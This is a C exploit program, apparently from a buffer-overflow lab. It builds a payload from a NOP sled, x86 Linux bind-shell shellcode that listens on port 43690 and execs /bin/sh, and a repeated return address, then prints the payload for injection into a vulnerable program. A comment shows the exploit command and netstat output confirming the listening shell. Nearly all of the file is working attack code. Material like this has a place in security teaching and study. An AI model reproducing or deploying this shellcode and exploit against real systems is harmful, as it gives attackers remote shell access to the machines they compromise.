#include <string.h>
#include <stdio.h>
#include <stdlib.h>

char *shellcode =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74\x07\x31\xdb\x89\xd8\x40\xcd\x80\x31\xc9\x31\xc0\x31\xdb\x51\x6a\x06"
    "\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc1\x31\xc0\x31\xdb\x50\x50\x50\x66\x68\xaa\xaa\xb3"
    "\x02\x66\x53\x89\xe2\xb3\x10\x53\xb3\x02\x52\x51\x89\xca\x89\xe1\xb0\x66\xcd\x80\x31\xdb\x39\xc3\x74\x07"
    "\x31\xdb\x89\xd8\x40\xcd\x80\x31\xc0\x40\x50\x52\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x31\xdb\x50\x50"
    "\x52\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc0\x31\xc9\x6a\x3f\x58\xcd\x80\x31\xc0\x41\x6a\x3f\x58"
    "\xcd\x80\x31\xc0\x41\x6a\x3f\x58\xcd\x80\x31\xc0\x68\x2f\x73\x68\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x88\x43"
    "\x07\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90";

/*
  ./shellcode
  esp: 0x7FFFF880
  ebp: 0x7FFFF8C8 <----
  esp-ebp: -72
                                                                 %ebp       sizeof(buf)   sizeof(argv[1])
  ./vulnerable $(./vulnerable_env $(python -c "print '0x%08X'%(0x7FFFF8C8 -    512      -    1024)"))
  esp: 0x7FFFF290
  ebp: 0x7FFFF4B8
  esp-ebp: -552
  &buf: 0x7FFFF2A8

  sudo netstat -napt
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  tcp        0      0 0.0.0.0:43690           0.0.0.0:*               LISTEN      5393/vulnerable
 */

int main(int argc, char **argv)
{
    int h;
    unsigned int ptr;
    char *buffer;
    int size = 1024;

    if (argc == 1) {
        unsigned int esp, ebp;

        __asm__ volatile ("movl %%esp, %0   \n"
                          "movl %%ebp, %1   \n"
                          : "=r"(esp), "=r"(ebp) : );

        printf("esp: 0x%08X\n", esp);
        printf("ebp: 0x%08X\n", ebp);
        printf("esp-ebp: %d\n", (int)esp - (int)ebp);

        printf("%s <address> <shellcode size>\n", argv[0]);

        return 0;
    }

    ptr = strtoul(argv[1], NULL, 0);

    if (argc == 3)
        size = atoi(argv[2]);
    if (!(buffer = malloc(size))) {
        printf("Unable to malloc =/\n");
        return 0;
    }

    for(h=0;h<size;h+=4)
        *((unsigned int *)buffer + h/4) = ptr;

    for(h=0;h<strlen(shellcode);h++)
        buffer[h] = shellcode[h];

    buffer[size-1] = '\0';

    printf("%s", buffer);

    return 0;
}
